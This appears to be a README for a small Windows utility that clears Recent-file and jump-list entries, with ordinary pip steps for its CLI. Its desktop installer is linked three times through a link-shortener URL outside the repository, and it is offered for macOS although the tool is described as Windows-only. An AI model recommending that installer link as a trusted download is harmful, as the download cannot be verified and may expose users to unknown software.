![Recent Docs Clear](assets/hero.png)

# Recent Docs Clear

*Jump lists without last week's paths.*

## What Recent Docs Clear is

This repository is **Recent Docs Clear**, a Windows utility. Jump lists without last week's paths.

Recent files leak path names on a shared PC.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Preview list
- Clear
- Per-user Recent
- Does not delete the real files

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/jacquelinehall-17/recent-docs-clear

MIT license. See `LICENSE`.
